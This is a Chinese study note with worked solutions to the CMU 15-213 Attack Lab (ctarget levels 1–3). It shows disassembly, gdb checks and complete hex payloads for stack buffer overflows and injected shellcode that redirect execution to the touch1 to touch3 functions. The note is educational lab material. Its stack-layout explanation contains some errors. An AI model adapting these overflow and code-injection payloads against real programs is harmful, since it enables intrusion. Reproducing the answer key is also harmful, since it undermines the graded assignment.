# L3-Attack-Note

提示: 本笔记显式地包括答案, 如果你想自己独立完成该实验, 建议只阅读 **准备工作** 与 **题目说明** 部分.

目前未完成.

## 目录

1. 准备工作
2. 题目说明
3. Hex2raw 工具讲解
4. 题解: CTARGET 
   1. touch1
   2. touch 2
   3. touch 3
5. 题解: RTARGET 
   1. touch 2
   2. touch 3
6. 后记



## 准备工作

记得阅读 attack.pdf

其他暂略

## 题目说明

根据教材第三章... 我们需要对代码...

记得加 `-q` 

cookie 的含义

### A:Hex2raw 工具讲解

### B:ByteCodes生成	

## 题解: CTARGET 

我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的. 出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.

下面的叙述均基于 CTARGET  为背景.

### **Level1**

#### test函数

这个函数是我们将攻击的代码, 在此小节以主函数称呼之. 我们通过 `getbuf` 函数输入一串字符, 理论上正常返回时会返回整型 `1` 储存在 `val`中 并打印, 退出. 

```c
//test 函数的C语言表述
1void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```



下面来观察汇编代码

```
//test 函数的汇编表述
Dump of assembler code for function test:
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
    0x000000000040196c <+4>:	mov    $0x0,%eax
    0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
    0x0000000000401976 <+14>:	mov    %eax,%edx
    0x0000000000401978 <+16>:	mov    $0x403188,%esi
    0x000000000040197d <+21>:	mov    $0x1,%edi
    0x0000000000401982 <+26>:	mov    $0x0,%eax
    0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
    0x000000000040198c <+36>:	add    $0x8,%rsp
    0x0000000000401990 <+40>:	retq 
```



我们注意<+9> 这一行, `callq` 函数的操作对象是一个地址, 目前这个地址是指向到 `getbuf`函数

在`getbuf`结束后, 应当返回到下一个地址, 即0x401976 , 称为原地址. 

> 事实上, 当我们在使用`callq`某个函数的时候, 下一条指令的地址(即上面提到的原地址) 会被push进栈中. 换言之, 当被调用函数结束, 执行 `retq`指令时, 是读取栈顶的元素作为跳转的地址. 在正常情况下就会跳转至原地址, 程序继续运行.

我们的目标就是替换掉栈顶的原地址, 将其修改为我们期望转到的 `touch1`函数的开始地址, 称为目标地址.

于是任务变成了:

1. 找到堆栈中原地址的储存位置
2. 确定目标地址的地址
3. 将原地址替换为目标地址



#### getbuf 函数

我们可以看到它的C代码如下

```c
//getbuf 函数的C语言表述
unsigned getbuf(){
	char buf[BUFFER_SIZE];
	GETs(buf);
	return 1;
}
```

首先的问题是, 我们需要知道这个缓冲区设置有多长? .我们照例查看其汇编代码:

```
//getbuf()
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
```

我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. 

这说明缓冲区大小即为0x28

> BUFF_SIZE 大小应该是与缓冲区是两个概念.
>
> 例如 教材3.10小节的代码. 实际上分配的字符数组为 `buf[8] `, 但是体现在汇编代码中就变成了`subq $24,%rsp` , 此处SIZE应该是8 , 而缓冲区大小则是 0x24.

在整个过程中栈的变化是这样的:

> 假设在test函数的`callq`语句调用之前, 栈顶指针`$rsp` 为 0x666600, 当前执行语句 `$rip` 为0x401971
>
> 1. 调用`callq`语句, 将下一条语句( 原地址, 0x0401976) 推入栈中, 即0x666600处, 栈指针 `$rsp`  变为0x666601
> 2. 进入`getbuf`语句, 在`0x4017a8`处分配了0x28个栈, 此时栈顶指针为0x666629
> 3. `getbuf`函数正常运行. 直到读入过量字符数组数据时, 将0x666600处的原地址覆盖为目标地址 ,此时栈顶依旧为0x666629
> 4. 继续运行至0x4017b9处, 收回栈空间, 此时栈顶又变为0x666601
> 5. `retq`语句, 取栈顶元素0x666600处的地址 (已经被覆盖成目标地址了) 并跳转. 即达到我们的目的.
>
> 嗯......应该不会有人疑惑上一步栈顶不是0x666601为什么取0x666600的元素吧...
>
> 因为栈指针是指向栈顶下一个地址的...

不妨使用gdb的查看指令检验一下

```
//在 +12 设置一个断点
//事先输入的字符串为 "abcdef"
(gdb) print (char*) ($rsp)
$1 = 0x5561dc78 "abcdef"
//可以看出, 堆栈的起始位置即储存了输入的字符串

(gdb) x/a ($rsp+0x28) 
0x5561dca0:	0x401976 <test+14>
//可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址. 
```

那么我们现在只需要使用目标地址替换原地址即可.

#### touch1 函数

```
//touch1 反汇编
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

显然目标地址就是 `0x4017c0`



因此, 我们应当输入的数字如下:

> 00 00 00 00 00 00 00 00 00 00 
>
> 00 00 00 00 00 00 00 00 00 00 
>
> 00 00 00 00 00 00 00 00 00 00 
>
> 00 00 00 00 00 00 00 00 00 00 
>
> c0 17 40 00 00 00 00 00 00 00 

上面的内容不能直接在`ctarget`运行时输入, 而要使用 `Hex2raw`工具处理. 具体请参看上面的  `Hex2raw` 讲解部分.

我们将上述材料存储在文件`in.txt`内, 并使用 `Hex2raw`工具将其转化为 二进制 文件并输入. 

```
//shell输入
./hex2raw  <in.txt> out
./ctarget -i out -q

//shell输出
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```

说明我们已经过了第一关



---



### Level2

第二题的背景依旧是test函数. 除了将getbuf函数中的返回地址改为touch2函数的地址外, 还需要将注入的字符串作为代码运行. 相对复杂.

我们先来看touch2函数

#### touch2 函数

```c
//touch2 函数的C语言表述
void touch2(unsigned val){
   if (val == cookie)
   {
      printf("Touch2!: You called touch2(0x%.8x)\n", val); 
      validate(2);
   }else
   {
      printf(printf("Misfire: You called touch2(0x%.8x)\n",val); 
      fail(2);
   }
}
```

 可见, touch2函数中会进行参数val与你的cookie进行比较, 当相同时才认为你通关. 接着看touch2的汇编代码

```
//touch2 函数的汇编表述
Dump of assembler code for function touch2:
    0x00000000004017ec <+0>:	sub    $0x8,%rsp
    0x00000000004017f0 <+4>:	mov    %edi,%edx
    0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
    0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
    0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
    0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
    0x0000000000401809 <+29>:	mov    $0x1,%edi
    0x000000000040180e <+34>:	mov    $0x0,%eax
    0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
    0x0000000000401818 <+44>:	mov    $0x2,%edi
    0x000000000040181d <+49>:	callq  0x401c8d <validate>
    0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
    0x0000000000401824 <+56>:	mov    $0x403110,%esi
    0x0000000000401829 <+61>:	mov    $0x1,%edi
    0x000000000040182e <+66>:	mov    $0x0,%eax
    0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
    0x0000000000401838 <+76>:	mov    $0x2,%edi
    0x000000000040183d <+81>:	callq  0x401d4f <fail>
    0x0000000000401842 <+86>:	mov    $0x0,%edi
    0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
```

这里注意一下 +4 行. `%edi` 还记得吗? 是默认的传入函数的第一个参数. 也就是说, 我们要在调用touch2之前, 将 `%edi`寄存器的值设置为我们的cookie. 如果只是类似上一题中的代码跳转的话, 我们没有办法对寄存器进行实际的修改, 所以我们需要将自己的代码注入进去后能够实际运行它们.

#### 注入代码的执行

具体的操作为: getbuf 结束后, 返回地址指向栈中. (准确的说是我们注入的字符数组) 使得我们注入的字符被解析成汇编代码并被运行. 在这段注入的代码末尾再跳转进touch2函数.

也就是说, 我们注入的字符需要实际上实现下面这段汇编代码的功能.

```
//注入代码需要实现的功能
//这些保存在 touch2_tmp.s 中
mov $0x59b997fa,%rdi		//将cookie写入%edi寄存器
pushq $0x4017ec				//将touch2首地址推入栈顶
retq						//retq在执行时,将跳转touch2函数
```

通过使用ByteCodes生成器(参看对应的讲解), 我们可以拿到这些ByteCode:

```
gcc -c touch2_tmp.s 			//使用汇编器生成二进制的可重定位目标程序touch2_tmp.o
objdump -d touch2_tmp.o >touch2_tmp.d	//使用objdump将目标文件得到中间文件

//下面是中间文件touch2_tmp.d中的内容,有精间
0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
7:   68 ec 17 40 00          pushq  $0x4017ec
c:   c3                      retq

```



#### 最后的小处理

我们还需要对最终的in2文件进行小小的处理

```
//这是 in2.txt 文件中的内容
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 
78 dc 61 55 00 00 00 00
```

上述代码的前3行就是我们拿到的 touch2_tmp.d 中的ByteCode

4-7行是为了填充缓冲区, 事实上1-7行一共有 0x28 个字符  <span style="background-color: #252525">不信你数数</span>

第8行是将getbuf函数的返回地址覆盖为第1行的地址 0x5561dc78, 这个地址是很容易拿到的.



**大功告成**

```
//shell输入
./hex2raw <in2.txt> out2
./ctarget -i out2 -q


//shell输出
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

第二关就过啦~~



### Level3

第三题的背景依旧是test函数. 表面逻辑: 在getbuf 函数结束后跳转至 touch3 函数. 并且在touch3函数中需要调用hexmatch函数, 后者是这么一个函数: 传入一个地址, 并读取该地址存储的字符串, 这个字符串应该是与cookie相同. (不包括前缀0x).

整体的思路类似Level2, getbuf 函数结束后跳转至缓冲区中注入的代码. 在注入代码中将参数1设置为字符串的地址, 并且注入代码段结束后跳转至touch3函数. 

在retq语句跳转至其他函数我们已经的轻车熟路了, 这里直接给出touch3的首地址: `0x4018fa`, 我们需要在注入代码中实现该地址的入栈, 这样注入代码的返回会读取栈顶, 从而跳转至touch3.

基本分析完毕, 现在需要考虑的只剩:

1. 注入什么字符串?
2. 将字符串注入在哪?

#### 字符串注入内容

我们需要将cookie转化为字符串, 这里需要注意两点: 

1. 每个字符占一个字节. 使用ASCII码表示
2. 字符串的结尾需要使用`\0`结尾

在Linux平台下, 执行`man ascii`命令可以获取ASCII码表, 对应的编码很容易对照获得

```
//cookie 的ASCII表述
35 39 62 39 39 37 66 61 00
```

#### 字符串注入位置

这里比较坑. 

我们看一下 hexmatch 函数

```c
//hexmatch C语言表述
int hexmatch(unsigned val, char *sval){
   char cbuf[110];
   char *s = cbuf + random()%100;
   sprintf(s, "%.8x", val);
   return strncmo(sval, s, 9) == 0;
}
```

当我们在对缓冲区写入的时候, 实际上的可以写入的地方包括: test函数的栈帧, getbuf函数的栈帧, 以及其他地方. 但是当我们从getbuf函数返回的时候, 原本的getbuf栈帧被回收(虽然里面的数据没有清掉) , 并且在之后分配在了hexmatch 的栈帧上. 

那么栈的分配与回收仅仅是栈指针的变动, 可不可以将数据依旧储存在栈帧里面呢? 很遗憾也是不行的. 在hexmatch函数中划分了一个长度为110 的char数组, 并且将s字符串的地址设置为其中的的任意处, 这就使得你原本储存的数据**有可能**被覆盖掉.

于是, 我们选择将数据写入test函数的栈帧中.

**存疑**: 可不可以将数据写入栈的其他位置? 比如栈 120 处.



#### 字节代码的编写

根据以上分析, 我们已经能够写出需要注入的部分

```
mov   $0x5561dca8,%rdi      //将字符串地址推入rdi 此条地址(执行代码的首地址)为0x5561dc78
pushq $0x4018fa             //touch3地址
retq
...补全缓冲区 28
...缓冲区内的执行代码的首地址 (8位地址)0x5561dc78
...储存cookie, 写入语句 35 39 62 39 39 37 66 61 00
```

上述1-3行, 是将会执行的代码, 包括将字符串地址设为参数1, 将touch3地址入栈, 以及返回touch3

第4行是填满缓冲区的, 1-4行总计28字节

缓冲区后属于test的栈帧, 最底处保存的是getbuf的retq返回地址, 指向执行代码的首地址.

test更往后的地方就是我们储存cookie的地方. 此处的地址即为字符串地址0x0x5561dca8



#### 最终答案

```
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

1-3: 执行代码

4-7: 填充

8: 执行代码的首地址

9: 字符串地址的首地址

**大功告成**

```
//shell输入
./hex2raw <in3.txt> out3
./ctarget -i out3 -q

//shell输出
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

